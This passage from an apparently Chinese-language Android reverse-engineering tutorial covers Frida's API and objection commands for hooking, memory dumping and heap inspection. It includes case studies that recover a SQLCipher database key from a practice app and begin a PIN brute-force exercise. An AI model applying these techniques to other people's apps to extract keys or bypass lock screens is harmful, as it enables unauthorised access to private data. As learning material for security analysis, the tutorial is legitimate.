b&#39;sakura:123456&#39;</span><br><span class="line">pw: 123456&#39;</span><br><span class="line">encoded data: b&#39;YWRtaW46MTIzNDU2Jw&#x3D;&#x3D;&#39;</span><br><span class="line">Modified data sent</span><br><span class="line">string_to_recv: b&#39;YWRtaW46MTIzNDU2Jw&#x3D;&#x3D;&#39;</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://github.com/Mind0xP/Frida-Python-Binding" target="_blank" rel="noopener">https://github.com/Mind0xP/Frida-Python-Binding</a></p><h3 id="API-List"><a href="#API-List" class="headerlink" title="API List"></a>API List</h3><ul><li><p><code>Java.choose(className: string, callbacks: Java.ChooseCallbacks): void</code><br>通过扫描Java VM的堆来枚举className类的live instance。</p></li><li><p><code>Java.use(className: string): Java.Wrapper&lt;{}&gt;</code><br>动态为className生成JavaScript Wrapper，可以通过调用<code>$new()</code>来调用构造函数来实例化对象。<br>在实例上调用<code>$dispose()</code>以对其进行显式清理，或者等待JavaScript对象被gc。 </p></li><li><p><code>Java.perform(fn: () =&gt; void): void</code><br>Function to run while attached to the VM.<br>Ensures that the current thread is attached to the VM and calls fn. (This isn’t necessary in callbacks from Java.)<br>Will defer calling fn if the app’s class loader is not available yet. Use Java.performNow() if access to the app’s classes is not needed.</p></li><li><p><code>send(message: any, data?: ArrayBuffer | number[]): void</code><br>任何JSON可序列化的值。<br>将JSON序列化后的message发送到您的基于Frida的应用程序，并包含(可选)一些原始二进制数据。<br>The latter is useful if you e.g. dumped some memory using NativePointer#readByteArray().</p></li><li><p><code>recv(callback: MessageCallback): MessageRecvOperation</code><br>Requests callback to be called on the next message received from your Frida-based application.<br>This will only give you one message, so you need to call recv() again to receive the next one.</p></li><li><p><code>wait(): void</code><br>堵塞，直到message已经receive并且callback已经执行完毕并返回</p></li></ul><h2 id="Frida动静态结合分析"><a href="#Frida动静态结合分析" class="headerlink" title="Frida动静态结合分析"></a>Frida动静态结合分析</h2><h3 id="Objection"><a href="#Objection" class="headerlink" title="Objection"></a>Objection</h3><ul><li>参考这篇文章<br><a href="https://www.anquanke.com/post/id/197657" target="_blank" rel="noopener">实用FRIDA进阶：内存漫游、hook anywhere、抓包</a></li><li>objection<br><a href="https://pypi.org/project/objection/" target="_blank" rel="noopener">https://pypi.org/project/objection/</a></li></ul><h4 id="objection启动并注入内存"><a href="#objection启动并注入内存" class="headerlink" title="objection启动并注入内存"></a>objection启动并注入内存</h4><p><code>objection -d -g package_name explore</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~$ objection -d -g com.android.settings explore</span><br><span class="line">[debug] Agent path is: &#x2F;Users&#x2F;sakura&#x2F;.pyenv&#x2F;versions&#x2F;3.7.7&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;objection&#x2F;agent.js</span><br><span class="line">[debug] Injecting agent...</span><br><span class="line">Using USB device &#96;Google Pixel&#96;</span><br><span class="line">[debug] Attempting to attach to process: &#96;com.android.settings&#96;</span><br><span class="line">[debug] Process attached!</span><br><span class="line">Agent injected and responds ok!</span><br><span class="line"></span><br><span class="line">     _   _         _   _</span><br><span class="line"> ___| |_|_|___ ___| |_|_|___ ___</span><br><span class="line">| . | . | | -_|  _|  _| | . |   |</span><br><span class="line">|___|___| |___|___|_| |_|___|_|_|</span><br><span class="line">      |___|(object)inject(ion) v1.8.4</span><br><span class="line"></span><br><span class="line">     Runtime Mobile Exploration</span><br><span class="line">        by: @leonjza from @sensepost</span><br><span class="line"></span><br><span class="line">[tab] for command suggestions</span><br><span class="line">com.android.settings on (google: 8.1.0) [usb] #</span><br></pre></td></tr></table></figure><h4 id="objection-memory"><a href="#objection-memory" class="headerlink" title="objection memory"></a>objection memory</h4><h5 id="查看内存中加载的module-memory-list-modules"><a href="#查看内存中加载的module-memory-list-modules" class="headerlink" title="查看内存中加载的module memory list modules"></a>查看内存中加载的module <code>memory list modules</code></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">com.android.settings on (google: 8.1.0) [usb] # memory list modules</span><br><span class="line">Save the output by adding &#96;--json modules.json&#96; to this command</span><br><span class="line">Name                                             Base          Size                  Path</span><br><span class="line">-----------------------------------------------  ------------  --------------------  ---------------------------------------------------------------</span><br><span class="line">app_process64                                    0x64ce143000  32768 (32.0 KiB)      &#x2F;system&#x2F;bin&#x2F;app_process64</span><br><span class="line">libandroid_runtime.so                            0x7a90bc3000  1990656 (1.9 MiB)     &#x2F;system&#x2F;lib64&#x2F;libandroid_runtime.so</span><br><span class="line">libbinder.so                                     0x7a9379f000  557056 (544.0 KiB)    &#x2F;system&#x2F;lib64&#x2F;libbinder.so</span><br></pre></td></tr></table></figure><h5 id="查看库的导出函数-memory-list-exports-libssl-so"><a href="#查看库的导出函数-memory-list-exports-libssl-so" class="headerlink" title="查看库的导出函数 memory list exports libssl.so"></a>查看库的导出函数 <code>memory list exports libssl.so</code></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">com.android.settings on (google: 8.1.0) [usb] # memory list exports libssl.so</span><br><span class="line">Save the output by adding &#96;--json exports.json&#96; to this command</span><br><span class="line">Type      Name                                                   Address</span><br><span class="line">--------  -----------------------------------------------------  ------------</span><br><span class="line">function  SSL_use_certificate_ASN1                               0x7c8ff006f8</span><br><span class="line">function  SSL_CTX_set_dos_protection_cb                          0x7c8ff077b8</span><br><span class="line">function  SSL_SESSION_set_ex_data                                0x7c8ff098f4</span><br><span class="line">function  SSL_CTX_set_session_psk_dhe_timeout                    0x7c8ff0a754</span><br><span class="line">function  SSL_CTX_sess_accept                                    0x7c8ff063b8</span><br><span class="line">function  SSL_select_next_proto                                  0x7c8ff06a74</span><br></pre></td></tr></table></figure><h5 id="dump内存空间"><a href="#dump内存空间" class="headerlink" title="dump内存空间"></a>dump内存空间</h5><ul><li><code>memory dump all 文件名</code></li><li><code>memory dump from_base 起始地址 字节数 文件名</code><h5 id="搜索内存空间"><a href="#搜索内存空间" class="headerlink" title="搜索内存空间"></a>搜索内存空间</h5><code>Usage: memory search &quot;&lt;pattern eg: 41 41 41 ?? 41&gt;&quot; (--string) (--offsets-only)</code></li></ul><h4 id="objection-android"><a href="#objection-android" class="headerlink" title="objection android"></a>objection android</h4><h5 id="内存堆搜索实例-android-heap-search-instances-类名"><a href="#内存堆搜索实例-android-heap-search-instances-类名" class="headerlink" title="内存堆搜索实例 android heap search instances 类名"></a>内存堆搜索实例 <code>android heap search instances 类名</code></h5><p>在堆上搜索类的实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~$ objection -g myapplication.example.com.frida_demo explore</span><br><span class="line">Using USB device &#96;Google Pixel&#96;</span><br><span class="line">Agent injected and responds ok!</span><br><span class="line"></span><br><span class="line">[usb] # android heap search instances myapplication.example.com.frida_demo</span><br><span class="line">.MainActivity</span><br><span class="line">Class instance enumeration complete for myapplication.example.com.frida_demo.MainActivity</span><br><span class="line">Handle    Class                                              toString()</span><br><span class="line">--------  -------------------------------------------------  ---------------------------------------------------------</span><br><span class="line">0x2102    myapplication.example.com.frida_demo.MainActivity  myapplication.example.com.frida_demo.MainActivity@5b1b0af</span><br></pre></td></tr></table></figure><h5 id="调用实例的方法-android-heap-execute-实例ID-实例方法"><a href="#调用实例的方法-android-heap-execute-实例ID-实例方法" class="headerlink" title="调用实例的方法 android heap execute 实例ID 实例方法"></a>调用实例的方法 <code>android heap execute 实例ID 实例方法</code></h5><h5 id="查看当前可用的activity或者service-android-hooking-list-activities-services"><a href="#查看当前可用的activity或者service-android-hooking-list-activities-services" class="headerlink" title="查看当前可用的activity或者service android hooking list activities/services"></a>查看当前可用的activity或者service <code>android hooking list activities/services</code></h5><h5 id="直接启动activity或者服务-android-intent-launch-activity-launch-service-activity-服务"><a href="#直接启动activity或者服务-android-intent-launch-activity-launch-service-activity-服务" class="headerlink" title="直接启动activity或者服务 android intent launch_activity/launch_service activity/服务"></a>直接启动activity或者服务 <code>android intent launch_activity/launch_service activity/服务</code></h5><p><code>android intent launch_activity com.android.settings.DisplaySettings</code><br>这个命令比较有趣的是用在如果有些设计的不好，可能就直接绕过了密码锁屏等直接进去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.android.settings on (google: 8.1.0) [usb] # android hooking list services</span><br><span class="line">com.android.settings.SettingsDumpService</span><br><span class="line">com.android.settings.TetherService</span><br><span class="line">com.android.settings.bluetooth.BluetoothPairingService</span><br></pre></td></tr></table></figure><h5 id="列出内存中所有的类-android-hooking-list-classes"><a href="#列出内存中所有的类-android-hooking-list-classes" class="headerlink" title="列出内存中所有的类 android hooking list classes"></a>列出内存中所有的类 <code>android hooking list classes</code></h5><h5 id="在内存中所有已加载的类中搜索包含特定关键词的类。-android-hooking-search-classes-display"><a href="#在内存中所有已加载的类中搜索包含特定关键词的类。-android-hooking-search-classes-display" class="headerlink" title="在内存中所有已加载的类中搜索包含特定关键词的类。 android hooking search classes display"></a>在内存中所有已加载的类中搜索包含特定关键词的类。 <code>android hooking search classes display</code></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">com.android.settings on (google: 8.1.0) [usb] # android hooking search classes display</span><br><span class="line">[Landroid.icu.text.DisplayContext$Type;</span><br><span class="line">[Landroid.icu.text.DisplayContext;</span><br><span class="line">[Landroid.view.Display$Mode;</span><br><span class="line">android.hardware.display.DisplayManager</span><br><span class="line">android.hardware.display.DisplayManager$DisplayListener</span><br><span class="line">android.hardware.display.DisplayManagerGlobal</span><br></pre></td></tr></table></figure><h5 id="内存中搜索指定类的所有方法-android-hooking-list-class-methods-类名"><a href="#内存中搜索指定类的所有方法-android-hooking-list-class-methods-类名" class="headerlink" title="内存中搜索指定类的所有方法 android hooking list class_methods 类名"></a>内存中搜索指定类的所有方法 <code>android hooking list class_methods 类名</code></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.android.settings on (google: 8.1.0) [usb] # android hooking list class_methods java.nio.charset.Charset</span><br><span class="line">private static java.nio.charset.Charset java.nio.charset.Charset.lookup(java.lang.String)</span><br><span class="line">private static java.nio.charset.Charset java.nio.charset.Charset.lookup2(java.lang.String)</span><br><span class="line">private static java.nio.charset.Charset java.nio.charset.Charset.lookupViaProviders(java.lang.String)</span><br></pre></td></tr></table></figure><h5 id="在内存中所有已加载的类的方法中搜索包含特定关键词的方法-android-hooking-search-methods-display"><a href="#在内存中所有已加载的类的方法中搜索包含特定关键词的方法-android-hooking-search-methods-display" class="headerlink" title="在内存中所有已加载的类的方法中搜索包含特定关键词的方法 android hooking search methods display"></a>在内存中所有已加载的类的方法中搜索包含特定关键词的方法 <code>android hooking search methods display</code></h5><p>知道名字开始在内存里搜就很有用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">com.android.settings on (google: 8.1.0) [usb] # android hooking search methods display</span><br><span class="line">Warning, searching all classes may take some time and in some cases, crash the target application.</span><br><span class="line">Continue? [y&#x2F;N]: y</span><br><span class="line">Found 5529 classes, searching methods (this may take some time)...</span><br><span class="line">android.app.ActionBar.getDisplayOptions</span><br><span class="line">android.app.ActionBar.setDefaultDisplayHomeAsUpEnabled</span><br><span class="line">android.app.ActionBar.setDisplayHomeAsUpEnabled</span><br></pre></td></tr></table></figure><h5 id="hook类的方法（hook类里的所有方法-具体某个方法）"><a href="#hook类的方法（hook类里的所有方法-具体某个方法）" class="headerlink" title="hook类的方法（hook类里的所有方法/具体某个方法）"></a>hook类的方法（hook类里的所有方法/具体某个方法）</h5><ul><li><code>android hooking watch class 类名</code><br>这样就可以hook这个类里面的所有方法，每次调用都会被log出来。</li><li><code>android hooking watch class 类名 --dump-args --dump-backtrace --dump-return</code><br>在上面的基础上，额外dump参数，栈回溯，返回值 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class xxx.MainActivity --dump-args --dump-backtrace --dump-return</span><br></pre></td></tr></table></figure></li><li><code>android hooking watch class_method 方法名</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;可以直接hook到所有重载</span><br><span class="line">android hooking watch class_method xxx.MainActivity.fun --dump-args --dump-backtrace --dump-return</span><br></pre></td></tr></table></figure><h4 id="grep-trick和文件保存"><a href="#grep-trick和文件保存" class="headerlink" title="grep trick和文件保存"></a>grep trick和文件保存</h4>objection log默认是不能用grep过滤的，但是可以通过<code>objection run xxx | grep yyy的</code>方式，从终端通过管道来过滤。<br>用法如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~$ objection -g com.android.settings run memory list modules | grep libc</span><br><span class="line">Warning: Output is not to a terminal (fd&#x3D;1).</span><br><span class="line">libcutils.so                                     0x7a94a1c000  81920 (80.0 KiB)      &#x2F;system&#x2F;lib64&#x2F;libcutils.so</span><br><span class="line">libc++.so                                        0x7a9114e000  983040 (960.0 KiB)    &#x2F;system&#x2F;lib64&#x2F;libc++.so</span><br><span class="line">libc.so                                          0x7a9249d000  892928 (872.0 KiB)    &#x2F;system&#x2F;lib64&#x2F;libc.so</span><br><span class="line">libcrypto.so                                     0x7a92283000  1155072 (1.1 MiB)     &#x2F;system&#x2F;lib64&#x2F;libcrypto.so</span><br></pre></td></tr></table></figure>有的命令后面可以通过<code>--json logfile</code>来直接保存结果到文件里。<br>有的可以通过查看<code>.objection</code>文件里的输出log来查看结果。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;.objection$ cat *log | grep -i display</span><br><span class="line">android.hardware.display.DisplayManager</span><br><span class="line">android.hardware.display.DisplayManager$DisplayListener</span><br><span class="line">android.hardware.display.DisplayManagerGlobal</span><br></pre></td></tr></table></figure></li></ul><h3 id="案例学习"><a href="#案例学习" class="headerlink" title="案例学习"></a>案例学习</h3><h4 id="案例学习case1-《仿VX数据库原型取证逆向分析》"><a href="#案例学习case1-《仿VX数据库原型取证逆向分析》" class="headerlink" title="案例学习case1:《仿VX数据库原型取证逆向分析》"></a>案例学习case1:《仿VX数据库原型取证逆向分析》</h4><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1082706" target="_blank" rel="noopener">附件链接</a><br><a href="https://github.com/nelenkov/android-backup-extractor" target="_blank" rel="noopener">android-backup-extractor工具链接</a></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-100849.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;Desktop&#x2F;lab&#x2F;alpha&#x2F;tools&#x2F;android&#x2F;frida_learn$ java -version</span><br><span class="line">java version &quot;1.8.0_141&quot;</span><br><span class="line"></span><br><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;Desktop&#x2F;lab&#x2F;alpha&#x2F;tools&#x2F;android&#x2F;frida_learn$ java -jar abe-all.jar unpack 1.ab 1.tar</span><br><span class="line">0% 1% 2% 3% 4% 5% 6% 7% 8% 9% 10% 11% 12% 13% 14% 15% 16% 17% 18% 19% 20% 21% 22% 23% 24% 25% 26% 27% 28% 29% 30% 31% 32% 33% 34% 35% 36% 37% 38% 39% 40% 41% 42% 43% 44% 45% 46% 47% 48% 49% 50% 51% 52% 53% 54% 55% 56% 57% 58% 59% 60% 61% 62% 63% 64% 65% 66% 67% 68% 69% 70% 71% 72% 73% 74% 75% 76% 77% 78% 79% 80% 81% 82% 83% 84% 85% 86% 87% 88% 89% 90% 91% 92% 93% 94% 95% 96% 97% 98% 99% 100%</span><br><span class="line">9097216 bytes written to 1.tar.</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;Desktop&#x2F;lab&#x2F;alpha&#x2F;tools&#x2F;android&#x2F;frida_learn&#x2F;apps&#x2F;com.example.yaphetshan.tencentwelcome$ ls</span><br><span class="line">Encryto.db _manifest  a          db</span><br></pre></td></tr></table></figure><p>装个夜神模拟器玩</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:&#x2F;Applications&#x2F;NoxAppPlayer.app&#x2F;Contents&#x2F;MacOS$ .&#x2F;adb connect 127.0.0.1:62001</span><br><span class="line">* daemon not running. starting it now on port 5037 *</span><br><span class="line">adb E  5139 141210 usb_osx.cpp:138] Unable to create an interface plug-in (e00002be)</span><br><span class="line">* daemon started successfully *</span><br><span class="line">connected to 127.0.0.1:62001</span><br><span class="line">sakura@sakuradeMacBook-Pro:&#x2F;Applications&#x2F;NoxAppPlayer.app&#x2F;Contents&#x2F;MacOS$ .&#x2F;adb shell</span><br><span class="line">dream2qltechn:&#x2F; # whoami</span><br><span class="line">root</span><br><span class="line">dream2qltechn:&#x2F; # uname -a</span><br><span class="line">Linux localhost 4.0.9+ #222 SMP PREEMPT Sat Mar 14 18:24:36 HKT 2020 i686</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-120749.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-121130.png" alt=""></p><p>肯定还是先定位目标字符串<code>Wait a Minute,What was happend?</code><br>jadx搜索字符串<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-121255.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-121403.png" alt=""></p><p>重点在a()代码里，其实是根据明文的name和password，然后<code>aVar.a(a2 + aVar.b(a2, contentValues.getAsString(&quot;password&quot;))).substring(0, 7)</code>再做一遍复杂的计算并截取7位当做密码，传入getWritableDatabase去解密demo.db数据库。</p><p>所以我们hook一下getWritableDatabase即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U</span><br><span class="line">...</span><br><span class="line">5662  com.example.yaphetshan.tencentwelcome</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">objection -d -g com.example.yaphetshan.tencentwelcome explore</span><br></pre></td></tr></table></figure><p>看一下源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">package net.sqlcipher.database;</span><br><span class="line">...</span><br><span class="line">public abstract class SQLiteOpenHelper &#123;</span><br><span class="line">    ...</span><br><span class="line">    public synchronized SQLiteDatabase getWritableDatabase(char[] cArr) &#123;</span><br></pre></td></tr></table></figure><p>也可以objection search一下这个method</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...mple.yaphetshan.tencentwelcome on (samsung: 7.1.2) [usb] # android hooking search methods getWritableDatabase</span><br><span class="line">Warning, searching all classes may take some time and in some cases, crash the target application.</span><br><span class="line">Continue? [y&#x2F;N]: y</span><br><span class="line">Found 4650 classes, searching methods (this may take some time)...</span><br><span class="line"></span><br><span class="line">android.database.sqlite.SQLiteOpenHelper.getWritableDatabase</span><br><span class="line">...</span><br><span class="line">net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase</span><br></pre></td></tr></table></figure><p>hook一下这个method</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[usb] # android hooking watch class_method net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase --dump-args --dump-backtrace --dump-return</span><br><span class="line">- [incoming message] ------------------</span><br><span class="line">&#123;</span><br><span class="line">  &quot;payload&quot;: &quot;Attempting to watch class \u001b[32mnet.sqlcipher.database.SQLiteOpenHelper\u001b[39m and method \u001b[32mgetWritableDatabase\u001b[39m.&quot;,</span><br><span class="line">  &quot;type&quot;: &quot;send&quot;</span><br><span class="line">&#125;</span><br><span class="line">- [.&#x2F;incoming message] ----------------</span><br><span class="line">(agent) Attempting to watch class net.sqlcipher.database.SQLiteOpenHelper and method getWritableDatabase.</span><br><span class="line">- [incoming message] ------------------</span><br><span class="line">&#123;</span><br><span class="line">  &quot;payload&quot;: &quot;Hooking \u001b[32mnet.sqlcipher.database.SQLiteOpenHelper\u001b[39m.\u001b[92mgetWritableDatabase\u001b[39m(\u001b[31mjava.lang.String\u001b[39m)&quot;,</span><br><span class="line">  &quot;type&quot;: &quot;send&quot;</span><br><span class="line">&#125;</span><br><span class="line">- [.&#x2F;incoming message] ----------------</span><br><span class="line">(agent) Hooking net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase(java.lang.String)</span><br><span class="line">- [incoming message] ------------------</span><br><span class="line">&#123;</span><br><span class="line">  &quot;payload&quot;: &quot;Hooking \u001b[32mnet.sqlcipher.database.SQLiteOpenHelper\u001b[39m.\u001b[92mgetWritableDatabase\u001b[39m(\u001b[31m[C\u001b[39m)&quot;,</span><br><span class="line">  &quot;type&quot;: &quot;send&quot;</span><br><span class="line">&#125;</span><br><span class="line">- [.&#x2F;incoming message] ----------------</span><br><span class="line">(agent) Hooking net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase([C)</span><br><span class="line">- [incoming message] ------------------</span><br><span class="line">&#123;</span><br><span class="line">  &quot;payload&quot;: &quot;Registering job \u001b[94mjytq1qeyllq\u001b[39m. Type: \u001b[92mwatch-method for: net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase\u001b[39m&quot;,</span><br><span class="line">  &quot;type&quot;: &quot;send&quot;</span><br><span class="line">&#125;</span><br><span class="line">- [.&#x2F;incoming message] ----------------</span><br><span class="line">(agent) Registering job jytq1qeyllq. Type: watch-method for: net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase</span><br><span class="line">...mple.yaphetshan.tencentwelcome on (samsung: 7.1.2) [usb] #</span><br></pre></td></tr></table></figure><p>hook好之后再打开这个apk<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-125545.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-125604.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(agent) [1v488x28gcs] Called net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase(java.lang.String)</span><br><span class="line">...</span><br><span class="line">(agent) [1v488x28gcs] Backtrace:</span><br><span class="line">net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase(Native Method)</span><br><span class="line">com.example.yaphetshan.tencentwelcome.MainActivity.a(MainActivity.java:55)</span><br><span class="line">com.example.yaphetshan.tencentwelcome.MainActivity.onCreate(MainActivity.java:42)</span><br><span class="line">android.app.Activity.performCreate(Activity.java:6692)</span><br><span class="line">...</span><br><span class="line">(agent) [1v488x28gcs] Arguments net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase(ae56f99)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...mple.yaphetshan.tencentwelcome on (samsung: 7.1.2) [usb] # jobs list</span><br><span class="line">Job ID         Hooks  Type</span><br><span class="line">-----------  -------  -----------------------------------------------------------------------------</span><br><span class="line">1v488x28gcs        2  watch-method for: net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase</span><br></pre></td></tr></table></figure><p>找到参数<code>ae56f99</code><br>剩下的就是用这个密码去打开加密的db。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-125824.png" alt=""><br>然后base64解密一下就好了。</p><p>还有一种策略是主动调用,基于数据流的主动调用分析是非常有意思的。<br>即自己去调用a函数以触发getWritableDatabase的数据库解密。<br>先寻找a所在类的实例，然后hook getWritableDatabase，最终主动调用a。<br>这里幸运的是a没有什么奇奇怪怪的参数需要我们传入，主动调用这种策略在循环注册等地方可能就会有需求8.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> [usb] # android heap search instances com.example.yaphetshan.tencentwelcome.MainActivity</span><br><span class="line">Class instance enumeration complete for com.example.yaphetshan.tencentwelcome.MainActivity</span><br><span class="line">Handle    Class                                               toString()</span><br><span class="line">--------  --------------------------------------------------  ----------------------------------------------------------</span><br><span class="line">0x20078a  com.example.yaphetshan.tencentwelcome.MainActivity  com.example.yaphetshan.tencentwelcome.MainActivity@1528f80</span><br><span class="line"></span><br><span class="line"> [usb] # android hooking watch class_method net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase --dump-args --dump-backtrace --dump-return</span><br><span class="line"></span><br><span class="line">[usb] # android heap execute 0x20078a a</span><br><span class="line"></span><br><span class="line">(agent) [taupgwkum4h] Arguments net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase(ae56f99)</span><br></pre></td></tr></table></figure><h4 id="案例学习case2-主动调用爆破密码"><a href="#案例学习case2-主动调用爆破密码" class="headerlink" title="案例学习case2:主动调用爆破密码"></a>案例学习case2:主动调用爆破密码</h4><p><a href="https://bbs.pediy.com/thread-257745.htm" target="_blank" rel="noopener">附件链接</a></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-132438.png" alt=""></p><p>因为直接找<code>Unfortunately,note the right PIN :(</code>找不到，可能是把字符串藏在什么资源文件里了。<br>review代码之后找到校验的核心函数，逻辑就是将input编码一下之后和密码比较，这肯定是什么不可逆的加密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 